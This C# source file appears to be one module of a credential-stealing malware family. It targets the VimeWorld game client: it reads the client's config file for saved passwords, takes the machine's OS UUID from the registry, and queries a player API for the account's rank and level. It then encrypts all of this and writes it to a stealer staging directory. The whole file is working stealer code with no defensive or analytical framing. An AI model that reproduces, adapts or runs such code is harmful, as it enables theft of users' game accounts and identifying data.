using Microsoft.Win32;
using System;
using System.IO;
using System.Net;
using System.Text;

namespace youknowcaliber
{
    class Vime
    {
        public static string patchConfig = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\.vimeworld", "config"); //Путь до конфига
        public static string InfoPlayer;
        public static void Get()
        {
            try
            {
                string Stealer_Dir = Help.ExploitDir;
                if (!File.Exists(patchConfig))
                    return;
                string ConfigText;
                using (StreamReader myReader = new StreamReader(patchConfig))
                {
                    ConfigText = myReader.ReadToEnd();
                }
                if (!ConfigText.Contains("password"))
                    return;
                string patch = Stealer_Dir + @"\VimeWorld";
                Directory.CreateDirectory(patch);
                if (Config.VimeWorld == true)
                {
                    WebClient wc = new WebClient();
                    InfoPlayer = wc.DownloadString(Help.VimeAPI + NickName());
                }
                string destFile = Path.Combine(patch, (Config.VimeWorld == true ? Donate() + Level():"") + NickName());
                ConfigText = ConfigText + "||||" + OSSUID();
                ConfigText = AES.EncryptStringAES(ConfigText, Config.key);
                using (StreamWriter myWriter = new StreamWriter(destFile))
                {
                    myWriter.WriteLine(ConfigText);
                }
                Counting.VimeWorld++;
            }
            catch (Exception e)
            {
                Console.WriteLine(e + "Ошибка с Vime.Get");
            }
        }
        public static string Level()
        {
            string text = InfoPlayer;
            int x = text.IndexOf("\"level\":");
            text = text.Substring(x + 8);
            x = text.IndexOf(",");
            string level = text.Substring(0, x);
            return "[" + level + "]";
        }
        public static string Donate()
        {
            string text = InfoPlayer;
            int x = text.IndexOf("\"rank\":");
            text = text.Substring(x + 8);
            x = text.IndexOf("\"");
            string RANG = text.Substring(0, x);
            return "[" + RANG + "]";
        }
        public static string OSSUID()
        {
            try
            {
                RegistryKey wKey = Registry.CurrentUser.OpenSubKey(@"Software\VimeWorld"); //Путь
                string Key = wKey.GetValue("osuuid") as string; //Чтение и конвертация
                return Key;
            }
            catch (Exception e)
            {
                Console.WriteLine(e + "Ошибка с OSSUID");
                return "Error";
            }
        }
        public static string NickName()
        {
            try
            {
                string Nick = "Error";
                StreamReader str = new StreamReader(patchConfig, Encoding.Default);
                while (!str.EndOfStream)
                {
                    Nick = str.ReadLine();
                    if (Nick.StartsWith("username:"))
                    {
                        Nick = Nick.Substring(Nick.IndexOf(':') + 1);
                        break;// останавливаем цикл
                    }
                }
                return Nick;
            }
            catch (Exception e)
            {
                Console.WriteLine(e + "ошибка NickName");
                return "Error";
            }
        }
    }
}
